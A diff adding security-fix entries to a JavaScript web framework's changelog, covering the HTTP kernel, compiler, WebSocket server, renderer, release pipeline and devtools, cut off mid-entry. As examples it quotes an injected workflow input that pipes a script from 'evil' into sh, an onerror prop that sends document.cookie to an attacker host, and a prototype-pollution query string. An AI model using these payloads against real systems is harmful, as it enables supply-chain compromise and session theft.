@@ -9,6 +9,771 @@ follow [Semantic Versioning](https://semver.org).
 
 ## [Unreleased]
 
+### Security (http kernel)
+
+An adversarial audit across every package reproduced each of the following against real sockets
+and real browsers. The pattern worth naming, because it explains all of them: the kernel's
+guarantees held exactly as documented, and nothing OUTSIDE the kernel re-established them.
+
+- **The routed path was built from the client-controlled `Host` header.** `AdapterRequest.url`
+  composed `${scheme}://${authority}${target}` from raw `headers.host`, of which only
+  `X-Forwarded-Host` was ever validated, and the kernel recovers the path by scanning for the
+  first `/` after `://`. A `/`, `?` or `#` inside `Host` therefore moved the authority/path
+  boundary: `GET / HTTP/1.1` with `Host: h/admin` executed the `/admin` handler, and
+  `GET /admin` with `Host: h?x` executed `/admin` while `context.url.pathname` reported `/`.
+  Every layer that reasons about the path disagreed with the router - an ingress or WAF path
+  rule saw `/`, an in-app prefix guard saw `/`, and the shipped request logger recorded `/` or,
+  for a `Host` that would not parse at all, nothing. `Host` is now validated with the same
+  grammar `X-Forwarded-Host` already used, falling back to `localhost`.
+
+- **`context.path` is new, and it is the path to make policy decisions on.** The router matches
+  decoded, slash-collapsed segments, so `/%61dmin`, `//admin` and `/admin//` are all the route
+  `/admin` - while `url.pathname` preserves the client's spelling, so a prefix check written on
+  it could be bypassed by re-spelling the path that still reached the protected handler. There
+  was no canonical path available to compare against; now there is one.
+
+- **A single request could kill the process, through five reachable triggers.** `App.handle`
+  cannot reject, but the layers around it could, and nothing caught them: the node adapter
+  dispatched into a bare `.then()`, `pipeline()` had no error path at all, and no
+  `unhandledRejection` handler existed anywhere in the framework, so Node's default policy
+  (terminate) applied. Confirmed triggers: a CORS `origin` predicate throwing on the
+  `Origin: null` that sandboxed iframes send by themselves; a rate-limit store rejecting, which
+  the module's own docs invite by recommending Redis; `writeHead` throwing on an out-of-range
+  status or a CRLF in an error header; and `errorResponse` itself throwing from inside
+  `handle`'s catch on a `details` payload containing a BigInt or a cycle. `pipeline()` now
+  terminates the error path the way `App.handle` does, and the adapter catches whatever still
+  escapes, answering 500 before headers are sent and destroying the connection after.
+
+- **The last-resort error path could no longer fail.** `encodeError` guards its own
+  `JSON.stringify` and degrades to the envelope, `String(error)` is replaced by a stringifier
+  safe for a thrown value with no primitive conversion, and an error's mandated headers are
+  normalised through real `Headers` (which rejects CRLF and NUL) with the framing headers
+  re-asserted last, so a supplied `content-length` can no longer declare a length the body does
+  not have and desynchronise a keep-alive connection.
+
+- **`dev:false` published `HttpError.details` on a 5xx while hiding the message.** `details` now
+  follows the message rule: a 4xx still carries it (the 422 validation field map is the
+  documented form contract and is unaffected), a 5xx does not. A DSN with credentials and the
+  SQL that failed were previously returned to the client on a 500.
+
+- **A response header written the standard way could be silently dropped in production.**
+  `PayloadResponse.headers` materialises a detached view, and the adapter wrote only the raw
+  record, so `response.headers.set('cache-control', 'no-store')` in middleware was reported by
+  `app.handle()` - the entire documented testing story - and never reached the socket. A
+  `Set-Cookie` added that way was dropped in production while the test asserting it passed.
+  Once the view exists it is now the truth `raw()` reports.
+
+- **Middleware additions can no longer forge the context.** Additions were `Object.assign`ed
+  flat, including over the reserved `request`, `params` and `url` keys, so a middleware
+  returning parsed request data (`app.use((c) => readJson(c.request))`) let a body of
+  `{"params":{"id":"admin"}}` replace the path params a handler authorises on. Reserved keys are
+  skipped and only own properties are copied.
+
+- **A registered route could be unreachable with no warning.** The router's backtracking reacted
+  only to STRUCTURAL dead ends, so a static terminal holding a different method ended the walk:
+  `app.get('/users/me')` made `app.post('/users/:id')` answer 405 for that one id, and a static
+  GET shadowed a wildcard POST the same way. The verb is now part of the match, and the 405's
+  `Allow` reports every method reachable at that path rather than one terminal's.
+
+- **An aborted streaming request leaked whatever its cleanup owned.** Cleanups were deferred to
+  the response body, which runs them from `pull` or `cancel` - but an adapter that finds the
+  socket already destroyed dropped the response without reading or cancelling it, so
+  `onRequestCleanup` never ran: pooled connections stayed checked out and transactions stayed
+  open, which is pool exhaustion under repetition. The request's abort signal now also settles
+  the root, and the adapter cancels the body it cannot write.
+
+- **`json()`/`text()`/`html()` at 204, 205 or 304 declared a `Content-Length` with no body**,
+  which RFC 9112 section 6.2 forbids and which is the shape a framing desync is built from.
+
+### Security (compiler)
+
+- **A carriage return in any emitted string literal produced INVALID JavaScript, and the Windows
+  default checkout triggered it.** The literal escaper handled `\`, `'` and `\n` but not U+000D,
+  and a raw CR inside a single-quoted JS literal is a LineTerminator, so the emitted module was a
+  syntax error. Five paths delivered one, including `<style>`/`<script>` raw text and static
+  attribute values, which means `core.autocrlf=true` (Git for Windows' default) plus any
+  multi-line `<style>` failed the build - and the error was misattributed to the author's markup
+  rather than the compiler's escaping. U+2028 and U+2029 are now escaped too, and the emitted
+  module is validated with a real `node --check` in the regression tests.
+
+- **A whitespace run with no newline made text normalisation quadratic.** Measured 18,263 ms
+  through `generateModule` for 160,000 spaces, versus 2.4 ms after. It matters far beyond a build:
+  the same normalisation runs in `lintSource` and `generateVirtualCode`, which the language server
+  and the ESLint processor execute on every keystroke, so one such file made the editor
+  unresponsive. The newline test now happens in JavaScript rather than inside the pattern, so
+  there is nothing left to backtrack.
+
+- **`emitDeclarations` wrote generated `.d.ts` files OUTSIDE the Vite root and overwrote existing
+  ones.** For any `.azeroth` module resolved outside the root (a monorepo sibling, a linked
+  workspace), the relative path began with `..` segments that path joining then normalised away,
+  climbing out of the mirror directory and then out of the root. Confirmed destructive: a
+  hand-written `Shared.d.ts` outside the root was replaced with generated content. Every write now
+  verifies containment first and skips rather than escaping.
+
+- **A static `innerHTML=` or `textContent=` rendered differently in the two modes.** The dynamic
+  path checked the DOM-property table and the static path did not, so the value was baked into the
+  template string as an inert lowercased attribute in the clone path while the SSR path treated it
+  as raw content. One artifact, two different DOMs, and the type check reported nothing. Both
+  paths now go through the same property write, including through the constant-folding door, which
+  was the same defect by another route.
+
+- Also: character references now decode in a static attribute value as they always did in text
+  (`title="Tom &amp; Jerry"` rendered the literal entity before), and the markup depth cap is
+  threaded through expression holes in all three walkers, so deeply nested markup raises a LOCATED
+  compile error instead of an unhandled `RangeError` out of `generateVirtualCode` - the single
+  projection behind the language service, the TS plugin, the ESLint processor and the type checker.
+
+### Security and correctness (CLI, packaging, release)
+
+- **`release.mjs --no-bump` published without verifying the tree, the tag, the version or the
+  branch.** The clean-tree check sat inside the bump branch, so a dirty tree published as-is and
+  `npm publish` packs the working tree rather than the tag; `--skip-checks` skipped the only step
+  that clears `dist/`; the version being published was never cross-checked against any manifest,
+  so it could differ from the one the dist-tag moved; and nothing checked the branch, with publish
+  happening before push so a missing tag was discovered only after the registry had been mutated.
+  Confirmed: a run from a tree with 37 modified files was accepted and would have published all
+  fifteen packages at the wrong version, then moved `latest` to a version never published. The
+  clean-tree check now covers any publishing run, `--no-bump` asserts the manifest version matches
+  and that the tag exists and points at HEAD, and a branch guard with `--allow-branch` covers runs
+  that create history. `--skip-checks` while publishing now says out loud that every `dist/` on
+  disk ships as-is.
+
+- **The npm OTP was printed once per package, thirty times per release.** The command log included
+  the full argv, and npm accepts long-lived reusable RECOVERY codes as well as short-lived TOTP,
+  so a pasted log or a CI artifact could hand over publish authority. The code now travels in
+  `NPM_CONFIG_OTP` and never appears in an argv, with a redactor left on the logging path as a
+  standing guard.
+
+- **`azeroth upgrade` could not run at all on Windows.** It spawned `npm.cmd` with `shell: false`,
+  which the CVE-2024-27980 fix refuses on every Node the package supports, so the verb always
+  failed and reported it as a registry error. npm is now reached through its entry script with an
+  argument array and no shell, matching what every other child spawn in the CLI already did.
+
+- **`azeroth upgrade` also destroyed dependency specifiers it should never have touched.** The pin
+  rewrite matched any azeroth-scoped key anywhere in the manifest TEXT and replaced the whole
+  value, so `file:`, `workspace:`, `git:` and multi-part ranges were all overwritten with an exact
+  version, in `peerDependencies` and `overrides` as well - a library author who ran it then
+  published an unsatisfiable peer constraint to every consumer. It now parses the manifest, walks
+  only the three dependency sections, rewrites only plain semver pins, and reports what it skipped.
+
+- **`create-azeroth` could scaffold outside the working directory**, including to the drive root,
+  because the name pattern allowed `.` and `/`. The name must now be a single npm-shaped package
+  segment and the resolved target is asserted to be inside the working directory.
+
+- **Every published tarball shipped sourcemaps whose sources were not in the tarball**, 494 files
+  and 1.49 MB of dead weight that actively misdirected stack traces and go-to-definition. Maps are
+  excluded from the published files while staying on disk for local development: 1,123 files down
+  to 629, and `publint` still passes for all fifteen packages.
+
+- Also: `mountPages` now fails at request time with an error naming `clientDir` and both filenames
+  it looked for, instead of killing the process with a bare ENOENT from an unhandled rejection at
+  boot; `kit prerender` asserts its output path stays inside the output directory, so a route path
+  containing `..` is a build error rather than a write two levels up; `azeroth doctor` no longer
+  reports a spawn hazard because a file merely mentions `shell: true` in a comment (it flagged this
+  repository's own release script) and now catches a real one in a file with no `spawn(` call; and
+  the publish smoke gate checks the `bin` targets of every installed package rather than one,
+  which is 6 instead of 3.
+
+### Fixed (CLI and the fullstack template)
+
+- **A freshly scaffolded fullstack app died at boot.** Found by booting a real scaffold rather
+  than by any test. The template guarded its devtools call on `config.env === 'development'` - a
+  value `loadConfig` DEFAULTS when nothing is set - while `attachDevtools` checks the raw
+  `process.env.NODE_ENV`. A scaffold ships no `.env`, so nothing set it: the template's branch was
+  true, the bridge it called refused, and the exception took the process down at module scope. The
+  two sides were reading different facts about the same thing.
+
+  Fixed on both sides, and neither alone is enough. `azeroth dev` now DECLARES
+  `NODE_ENV=development` to its children when nothing has set it, because `dev` is the development
+  command and the framework's dev-only gates check that value positively (an unset variable has to
+  mean "not development", or a production deploy that forgot it would open them). And the template
+  now reads the same raw variable the bridge does, so a bare `node src/main.ts` with no environment
+  boots cleanly with the bridge simply not attached. `npm run dev` gets the panel; nothing else
+  does. Verified in all three states: unset, `development`, and through the CLI.
+
+### Security (renderer, stricter than React by choice)
+
+Three positions the framework previously shared with React are now tightened, each with an
+explicit escape hatch. The framework targets banks, exchanges and payment gateways, where the
+cost of an unexpected refusal is a build error and the cost of a permissive default is an
+incident.
+
+- **Dangerous URL schemes are refused** on `href`, `src`, `action`, `formaction`, `poster`,
+  `xlink:href` and `data`: `javascript:`, `vbscript:`, and any `data:` that is not an image.
+  `data:image/svg+xml` stays refused, because SVG carries script. The candidate is normalised
+  before its scheme is read, so `java\tscript:` cannot slip past. `srcdoc` is refused outright.
+  Ordinary URLs and inline `data:image/png` are untouched, and `unsafeUrl(value)` is the opt-out.
+  Applied through the SAME gate on both render paths, because a divergence between them is one of
+  the defects this session already fixed. Fixing it surfaced a real parity bug: the serializer
+  called the gate with the RAW prop, so a reactive `href={() => evil()}` was checked on the client
+  and unchecked on the server.
+
+- **Executable tag names are refused** in `h()`: a `<script>` that would actually run (no `type`,
+  or a JavaScript MIME), plus `base`, `object` and `embed`. `iframe` stays allowed, because every
+  video and payment embed is one, and so does a data-block `script` such as
+  `application/ld+json`, which is a documented pattern with dedicated escaping in the serializer.
+  `unsafeTag(name)` is the opt-out. Note this covers `h()`, not static markup: a `<script>` written
+  literally in a `.azeroth` file is compiled into a cloned template and never reaches `h()`, which
+  is the author writing a script tag deliberately rather than a tag name arriving from data.
+
+- **Hydration strips injected event-handler attributes.** Adoption applied the client's props over
+  whatever the server sent and kept the rest, so an `on*` attribute smuggled into the server HTML
+  survived onto the live page. The client never legitimately sets an `on*` ATTRIBUTE, so any found
+  during adoption is removed. Creation is untouched.
+
+- **A leaving `Transition` or `TransitionGroup` row stops being interactive.** Both kept the
+  element in the DOM with its handlers and reactive scope alive for the whole leave animation, up
+  to a one second fallback, so a "Confirm payment" button was clickable while it animated away.
+  Both now carry one framework-owned attribute and one injected, author-overridable
+  `pointer-events: none` rule; no inline style is ever mutated. `TransitionGroup` had the same
+  defect as its sibling and was not in the original finding, which is the pattern this whole audit
+  kept turning up.
+
+### Security (contract layer, second pass)
+
+- **BREAKING: `only()` returns a wrapper object rather than a branded array.** The brand was a
+  value property, so it survived at runtime but was erased by ANY widening annotation - a
+  `ReadonlyArray<Guard>` variable, a `GuardMap`-annotated map, a helper's declared return. An
+  erased brand meant the mount dropped the inherited chain while the handler stayed typed with the
+  additions of guards that never ran, which is exactly the bug `only()` exists to prevent. A
+  wrapper is not an array, so that assignment is now a compile error and the two sides cannot
+  disagree. Migration: nothing changes at the call site, `only([...])` still reads the same; only
+  code that spread or indexed the RESULT needs updating.
+
+- **BREAKING: a guard promises only what it actually attaches.** `guard()` inferred its additions
+  from a union that already contained `undefined | void`, so the everyday optional-session guard -
+  one with a conditional `return;` - still typed its additions as definitely-present. Every
+  handler behind it read `context.accountId` as a `number` while the anonymous path reached it
+  with the field absent, which is a latent null dereference on precisely the requests that carried
+  no credential. A guard that attaches on every path is now an `ExactGuard` and keeps exact types;
+  one that can attach nothing types its additions OPTIONAL and the handler has to narrow.
+
+- **A guard chain's additions are intersected, not unioned.** Two guards on one key both
+  `Object.assign` onto the same context, so both fields are present, but the type modelled that as
+  "one or the other". Unpinned by any test, and wrong in the direction that lets a handler miss a
+  field the chain guarantees.
+
+- **The typed client could execute a DIFFERENT route than the one it was called on.** A `:name`
+  path param was percent-encoded and a `*name` wildcard was interpolated RAW, so
+  `client.files.read({ params: { path: '../../admin/keys' } })` issued `GET /admin/keys` with the
+  client's configured auth headers attached and returned that route's body under the calling
+  route's declared type. Wildcard segments are now encoded individually - `/` survives, since a
+  wildcard is legitimately multi-segment - and a `.` or `..` segment is refused outright.
+
+- **The typed client followed redirects off-origin.** `redirect` was never set, so the fetch
+  default `follow` carried the configured headers (an API key, not just the `Authorization` the
+  spec strips) to whatever origin a `Location` named, then resolved with that origin's body typed
+  as the route's declared output. It is now `redirect: 'error'`: a contract route never
+  legitimately answers with a redirect the typed client should follow.
+
+- **The typed client now checks what it is handed, within a bound.** A 2xx body was returned with
+  no schema check and no byte cap, on both the success and the error path, so every consumer
+  treated a compromised, proxied or legacy upstream's response as contract-shaped data. Bodies are
+  validated against the route's declared schema and read within a 1 MiB default;
+  `validateResponses: false` and `maxResponseBytes` are the escape hatches for a server the
+  contract does not own.
+
+- **Two contract keys could address one route.** Nothing validated key names, so a group `admin`
+  holding `overview` and a top-level key spelled `'admin.overview'` computed the same dotted path:
+  one handler served both HTTP routes, `'admin.*'` guards leaked onto the route outside the group,
+  and OpenAPI emitted duplicate operation ids. A key containing `.` or `*`, or an empty key, is now
+  refused where the contract is DECLARED, so the error names the author's own literal.
+
+- **`merge()` reported a duplicate for a legitimate route key.** It tested `key in out` on a plain
+  object, so a route keyed `toString` or `constructor` collided with `Object.prototype` on the
+  first group. Same class as the prototype bugs already fixed in the mount.
+
+- **A guard that reads the request body now says so.** Verifying an HMAC over the raw bytes is the
+  reason to write such a guard, and it left the stream consumed so the mount's own read failed with
+  a locked-stream error surfacing as an opaque 500. The mount now names the cause and the fix.
+
+### Security (OpenAPI export and explorer)
+
+- **The spec and the docs page were public by default, with a third-party CDN script.** Neither
+  route had an environment gate, and `viewer` defaulted to Scalar, whose page loads an unpinned,
+  SRI-less script from a CDN - onto a page developers open against production data and paste
+  bearer tokens into. The default viewer is now the self-contained house explorer, and neither
+  route registers under `NODE_ENV=production` unless the app passes `public: true`. A spec
+  describes every internal route, its input shape and its constraints; publishing that should be a
+  decision, not a default.
+
+- **Component-name collisions silently corrupted the document.** `user.profile`, `user_profile`,
+  `user-profile` and `userProfile` all pascal-case to `UserProfile`, and on collision the second
+  schema OVERWROTE the first while both `$ref`s pointed at it - so a route was documented with a
+  different route's body, and the document stayed valid OpenAPI. Names are now claimed and
+  disambiguated deterministically, so rebuilds stay byte-identical.
+
+- **The explorer died on any contract containing a multipart route**, because it dereferenced
+  `content['application/json']` unconditionally while the exporter emits only
+  `multipart/form-data`. The throw escaped after the pane was already cleared, so the page was left
+  blank, and if the multipart operation came first the page never booted at all. It now reads the
+  first declared media type, the way its own responses loop always did, and offers a JSON editor
+  only for a JSON body. A reused multipart spec also no longer emits an orphan component.
+
+### Fixed (http kernel, second pass)
+
+- **A handler's reason phrase never reached the wire**: the adapter always called `writeHead`
+  without it, so `new Response(body, { status: 418, statusText: 'I am a teapot' })` arrived with
+  Node's default phrase.
+- **A route pattern containing a percent escape was permanently unreachable.** Request paths are
+  decoded per segment before matching but patterns never were, so `/my%20page` could only be
+  reached by a double-encoded `/my%2520page` while sitting in the boot table looking served. It is
+  now refused at registration, pointing at the decoded character. A bare `%` stays legal, because
+  it is genuinely reachable.
+
+### Security (release pipeline)
+
+- **CRITICAL: expression injection in the npm publish workflow.** `.github/workflows/publish.yml`
+  interpolated `${{ inputs.version }}` directly into a `run:` line, and Actions expands `${{ }}`
+  TEXTUALLY into the shell script before bash parses it - inside the job holding
+  `id-token: write`, the npm OIDC trusted-publishing identity for all fifteen packages. A dispatch
+  input of `1.1.0 -y; curl -s https://evil/x.sh | sh; #` would execute with publish authority and
+  could ship a malicious version carrying a VALID provenance attestation, which is the one thing
+  provenance is supposed to make impossible. Trusted publishing means the reviewed workflow file
+  is the only publish path, and this defeated that. The input now rides in through `env` and is
+  referenced quoted, and a prior step rejects anything that is not a bare semantic version. The
+  repository's own `release.yml` already used the safe pattern, so this was an inconsistency
+  rather than an unknown.
+
+### Security (WebSocket handshake and codec)
+
+- **CRITICAL: cross-site WebSocket hijacking was the DEFAULT.** The origin check only ran when the
+  application supplied a `verifyOrigin` callback, so out of the box any page on the internet could
+  open an authenticated socket to a downstream app using the victim's cookies. WebSockets are
+  exempt from CORS, so nothing else stopped it, and the natural way to authenticate an upgrade is
+  to read `request.headers.cookie` - which means the app author does nothing wrong and still ships
+  full session hijacking. On a trading platform that is order placement and balance exfiltration
+  from any site the victim visits. The gate now always runs: with no callback, an Origin must name
+  the same host and port the request was aimed at (parsed through `URL`, so IPv6 literals and
+  implied ports hold), and anything else is refused 403. A request with NO Origin, which is what a
+  non-browser client sends, stays allowed. The callback remains the override in both directions.
+  This matches the default the `ws` npm package chose, but `@azerothjs/devtools` already wrote its
+  own origin check, so the need was recognised one layer up and missed here.
+
+- **CRITICAL: the frame parser was O(n^2), so an ordinary upload starved every other
+  connection.** Every chunk allocated a new buffer and copied the whole retained one, and the
+  chunk count is set by the network rather than the sender, so a plain 16 MiB frame cost 2 GiB of
+  memcpy. Measured on the same input: 16 MiB arriving in 1400-byte segments went from **32,406 ms
+  of blocked event loop to 32.9 ms**, and 8 MiB in 64 KiB reads from 173.5 ms to 15.5 ms. The
+  parser now keeps a read/write window into a growable buffer, growth is clamped to the exact
+  byte count the pending frame still needs (so a declared-but-unsent 16 MiB length cannot make it
+  preallocate), the zero-copy single-chunk path is preserved, and it compacts only when the dead
+  prefix outgrows half the capacity. A randomised-chunking test asserts any segmentation
+  reassembles byte-identically to a single chunk.
+
+- **A throw in the upgrade gate killed the process.** `verifyOrigin` and `onConnection` both run
+  inside the server's `upgrade` listener, so a throw was an uncaught exception that took every
+  other live socket with it - and the realistic trigger is mundane: an `onConnection` parsing a
+  header, or a synchronous auth lookup failing because its backend is down. A throwing
+  `verifyOrigin` now refuses with 500. A throwing `onConnection` cannot be a 500, because the 101
+  is already on the wire by then, so that connection is closed with 1011 and its buffered replay
+  skipped. `onMessage` and `onClose` throws were already contained, which is what made the gap
+  easy to miss.
+
+- **There was no connection cap.** Connections were tracked in an unbounded set, so combined with
+  the per-connection parser buffer, 40 sockets held 641 MiB with no message ever completed: a
+  slowloris that no available option could bound. `maxConnections` refuses past the cap with 503,
+  checked before the origin gate and the handshake.
+
+- **The server emitted illegal control frames.** The parser enforced the 125-byte control limit
+  inbound while the serializer applied no check outbound, so a descriptive close reason (which
+  routinely embeds user or peer input, making its length attacker-influenced) produced a frame a
+  compliant peer MUST reject with 1002 - losing the application's close code entirely, so the
+  client saw a protocol error instead of "order rejected". Codes were not validated either:
+  `close(1006)` and `close(1005)` put codes on the wire that RFC 6455 section 7.4.1 says must
+  never appear, and `close(70000)` silently aliased to 4464. Reasons are now truncated to 123
+  bytes on a codepoint boundary, 1005 and 1006 map to an empty payload, an unsendable code is
+  refused by the codec, and the serializer rejects an oversized control payload. `close()` itself
+  stays total: it is a teardown path, so a forbidden code is normalised to 1000 rather than
+  throwing, because a connection left open because its close code was wrong is the worse outcome.
+
+- **The IANA close codes a gateway actually sends were rejected as protocol violations.** 1012
+  (service restart), 1013 (try again later) and 1014 (bad gateway) all died with 1002, so a client
+  could not distinguish "back off" from "you sent garbage" and would hot-retry into an already
+  overloaded service. One predicate now serves both directions with the correct range.
+
+- Conformance: a 64-bit length with the high bit set now closes with 1002 as the module's own
+  header always claimed; `Upgrade` is parsed as the token list RFC 7230 defines, so
+  `Upgrade: websocket, h2c` connects instead of being refused; and a `Host` header and HTTP/1.1 or
+  later are required per RFC 6455 section 4.1.
+
+### Security (WebSocket connection state)
+
+- **CRITICAL: two remote memory-exhaustion kills, neither bounded by the documented cap.** The
+  assembled-message limit counts BYTES, but RFC 6455 permits a zero-length fragment, so an endless
+  stream of them adds nothing to the total while the fragment array grows forever: measured 34.9x
+  wire-to-heap amplification, and 12 MB of traffic reaching a 512 MB heap ceiling with
+  `maxMessage: 1024` explicitly set. One-byte fragments defeat it the same way, so raising the cap
+  was no escape. Separately, every inbound ping was answered with an unconditional write and the
+  read side was never paused, so a client that floods pings while refusing to read queued one
+  userland write per ping: 13.7 MiB of pings grew the process to 751 MiB, while `bufferedAmount`
+  under-reported it by two orders of magnitude because the per-write bookkeeping dominates, so an
+  app watching that number saw nothing. Both are process kills, not dropped connections, so every
+  other live socket dies with them. Fragments are now capped by count as well as size, and an
+  automatic pong is dropped once the write queue is deep, which RFC 6455 section 5.5.3 explicitly
+  permits.
+
+- **Messages were delivered to `onMessage` AFTER `onClose` had already run.** The frame loop kept
+  iterating a chunk after a close frame tore the connection down, so one TCP segment containing
+  `[close][text]` ran the application's teardown and then handed it more messages. On an exchange
+  that is an order executing against a released session; on a wallet it is a signing request
+  processed after the auth context was dropped. The application could not defend against it,
+  because the framework's own contract says `onClose` fires when the connection is over. The loop
+  now stops at close, and `onMessage` is dropped alongside `onClose` with the data listener
+  detached and the partial-assembly state released.
+
+- **`drain()` never settled when the peer vanished**, because it waited only on the socket's
+  `'drain'` event and a destroyed socket never emits one. That is the documented backpressure
+  pattern (`if (!ws.send(x)) await ws.drain()`) meeting a slow consumer that then disconnects,
+  which on a market feed is the most ordinary event there is: the producer loop was abandoned
+  mid-iteration and its `finally` never ran, leaking whatever it held (a cursor, an advisory lock,
+  a reserved sequence number) for the process lifetime. It now settles on close and error too.
+  Against the old code the regression test does not fail fast, it hangs to the test timeout.
+
+- **`pongTimeoutMs >= heartbeatMs` silently disabled half-open reclamation entirely.** The pong
+  deadline was cleared and re-armed on every tick, so with a timeout at least as long as the
+  interval the timeout branch was unreachable and a peer that vanished without a FIN was never
+  terminated. `heartbeatMs: 30000, pongTimeoutMs: 30000` is a natural "give it a full interval to
+  answer" choice, and it turned the one defence against half-open sockets into a no-op with no
+  signal. A tick with a probe already outstanding now leaves the armed deadline alone.
+
+- **A throwing `onError` escaped as an uncaught exception**, out of the very handler meant to
+  contain failures, taking every other live connection with it. `onMessage` and `onClose` throws
+  were already contained, which is what made the gap easy to miss. Every report now goes through
+  one guarded path.
+
+- **`maxPayload` was unreachable, so per-connection memory could not be bounded.** The parser
+  enforced it but the socket constructed the parser without forwarding it, and the option was
+  absent from `ServerSocketOptions`, so every connection was fixed at the 16 MiB default no matter
+  what `maxMessage` said: an app setting `maxMessage: 1024` still let each socket pin a 16 MiB
+  parser buffer, and 40 connections held 641 MiB with no message ever completed. It is now a real
+  option, defaulting to `maxMessage`, enforced from the frame header before a byte is buffered.
+
+### Security (renderer, router, reactivity)
+
+- **A string-valued `on*` prop became a live inline event handler.** A prop counted as a handler
+  only when its value was a FUNCTION; anything else fell through to `setAttribute`, so
+  `onerror: "fetch('https://evil/?c='+document.cookie)"` was written as a live attribute. All
+  three paths agreed and all three were wrong: the client DOM, the SSR serializer, and
+  `bindProps`, which is what compiled `.azeroth` markup calls. The precondition is an app
+  forwarding an untrusted object as props, which is an ordinary pattern rather than an abuse, and
+  React refuses this case outright. Both paths now refuse it identically, reusing the policy the
+  SSR serializer already applied to invalid attribute NAMES: fail loudly rather than emit it raw.
+  The same gate closed the DOM path's missing name validation, so a hostile key in a data-driven
+  attribute bag can no longer abort a render halfway and blank a page region.
+
+- **SSR emitted `<script>` and `<style>` children verbatim, so the same component was inert
+  client-rendered and live markup server-rendered.** Raw-text content is CDATA, but CDATA is
+  closed by the element's own end tag and nothing neutralised it. The canonical JSON-LD pattern
+  with a user-controlled product name injected into the served document. Only the
+  element-terminating sequences are escaped, so legitimate content stays byte-identical.
+
+- **The scoped-CSS registry was process-global, so one request's CSS was served to every later
+  request and it grew without bound.** `collectStyleSheet()` returned every scope ever registered
+  rather than the ones the current render touched, and nothing in the render path ever reset it.
+  Two independent reviewers reproduced it and so did I: a `css` template interpolating an IBAN
+  appeared in the next request's document, growing about 151 bytes per render and never releasing.
+  String-mode `css()` calls are now recorded in a per-render frame that `collectStyleSheet()`
+  drains, matching the seam pattern render mode and store scopes already use. Client behavior is
+  unchanged.
+
+- **The `css()` scope rewrite corrupted every asset URL.** A blanket regex over the whole
+  stylesheet rewrote any `.identifier`, so `url(./logo.png)` became `url(./logo.png_<scope>)` and
+  `content: ".done"` was altered - a silent 404 for every image and font referenced from scoped
+  CSS, which survives review because the class names still work. The rewrite is now region-aware:
+  quoted strings, `url(...)` bodies and comments are copied verbatim.
+
+- **A throwing subscriber during a resource settle, and any `async` effect body that rejects,
+  escaped as unhandled rejections that nothing could catch.** The settle chains had no terminal
+  `.catch`, and `createEffect` discarded a returned promise entirely, so `catchError`,
+  `<ErrorBoundary>` and `onUncaughtError` all saw nothing - and on Node an unhandled rejection
+  terminates the process, making one malformed API payload a server crash the app could not
+  defend against at the boundary the framework tells it to use. All three now route through the
+  same last-resort path a synchronous effect error uses. `EffectFn` additionally declares
+  `Promise<void>`, and its doc states the constraint the type cannot: an async body tracks only
+  the reads that happen before the first `await`, and cannot register a cleanup.
+
+- **Event delegation recomputed the propagation path DURING dispatch**, reading `parentNode` after
+  each handler ran, while native dispatch computes the path first. So a handler that removed its
+  own node truncated the walk and every ancestor handler was silently skipped, and a handler that
+  REPARENTED its node delivered the event into a subtree that was never an ancestor. Delete and
+  reorder buttons are ubiquitous, so close-the-dropdown, click-outside, audit and optimistic-list
+  handlers stopped running with no error, and the reparent case acted on the wrong record. The
+  ancestor chain is now snapshotted before the first handler runs. `stopImmediatePropagation()` is
+  observed too, and the delegated-handler Symbols are cleared on `destroyComponent`.
+
+- **`parseQuery` let the URL rewrite the returned object's prototype, and silently dropped a
+  key.** `?__proto__=a&__proto__=b` (repeated, so the value is an array the prototype setter
+  accepts) replaced the prototype of `location().query`, and a single `?__proto__=x` vanished
+  entirely, so a query parameter could be made invisible to the app while still present in the URL
+  and in any server-side log or signature check that parsed it correctly. The result is
+  null-prototype now.
+
+- **The URL scheme classifier and the click interception disagreed**, which is a bypass rather
+  than a policy choice: the external-URL test allowed no whitespace, so `java\tscript:` was
+  classified INTERNAL, intercepted, and pushed into history as an app path, while the browser
+  strips those characters when resolving the rendered `href`. Control characters are now stripped
+  before the test so the two paths cannot disagree. Note the absence of a `javascript:` allowlist
+  is deliberate and matches React and React Router.
+
+- Also: props are iterated own-keys-only, so a prototype-pollution gadget elsewhere can no longer
+  inject attributes onto every element the renderer builds (React guards this path, so apps
+  migrating from it were losing a defence); `hydrateIslands` uses `allSettled` with a per-anchor
+  try/catch, so one malformed anchor no longer kills interactivity on the whole page, and an
+  inherited registry key degrades to the documented no-loader warning instead of a crash; and
+  `styleMap` rejects a property name from data and a value carrying `;` or `}` outside a quoted
+  string or `url()` body.
+
+### Security (devtools, schema, logger, cron)
+
+- **BREAKING: the devtools server bridge now requires a token, and `attachDevtools(server)`
+  becomes `attachDevtools(server, { token })`.** The bridge streams `exportSession()` on connect,
+  which is a preview of every live signal and memo - and because a request on this framework IS a
+  reactive root, that is per-request state. A reviewer's run over a plain socket with no
+  credentials read a session token, an account record with IBAN and balance, and an admin key.
+  Its entire perimeter was the `Origin` header, and the default check returned TRUE for a missing
+  Origin, which is exactly what a non-browser client sends. The environment guard compared
+  `NODE_ENV === 'production'` and therefore attached for unset, `""`, `Production`, `prod` and
+  `staging`. It is now gated four ways, all of which must pass: a POSITIVE `NODE_ENV=development`
+  check (so a misspelled or unset value refuses rather than opens), a shared token of at least 16
+  characters compared in constant time, a loopback peer, and a present localhost `Origin`.
+  `allowNonDevelopment` and `allowRemoteClients` are the explicit opt-outs. All four run before
+  the handshake, so a refusal writes no session byte, and a caller-supplied `verifyOrigin` can no
+  longer replace the token and peer checks. No inbound command surface was added: the bridge
+  still never reads a frame.
+
+- **A 1 MiB request body could cost 2.2 seconds of blocked event loop and a 148 MiB response.**
+  The schema issue collector was unbounded in its default collect-everything mode, and each array
+  element of an `object()` emits one issue PER DECLARED FIELD, so the canonical bulk shape
+  `array(object({...}))` turned a body under the kernel's own default limit into 1.75 million
+  issues, serialized into the 422 twice (as the issue list and as the field map). Issues are now
+  capped at 100 with the result marked `truncated`, and the array, object and record loops stop
+  once the ceiling is hit rather than walking the remaining elements. An ordinary handful of
+  failures still reports every one. No default `array()` maximum was added: the cap makes it
+  unnecessary, and silently rejecting a legitimate 2,000-element array would be a worse trade.
+
+- **One logger throw killed the cron process, and the framework's own logger threw on ordinary
+  values.** In the scheduler, `logger?.debug` ran synchronously inside a `setTimeout` callback
+  (an uncaught exception), and the settle-handler log calls rejected the promise that `void
+  run(job)` discarded - with the log line running BEFORE `report()`, so the `onError` observer
+  never saw the failure it exists to report. Meanwhile the logger's serializer called bare
+  `JSON.stringify`, which throws on a BigInt, a circular structure, a throwing getter, a throwing
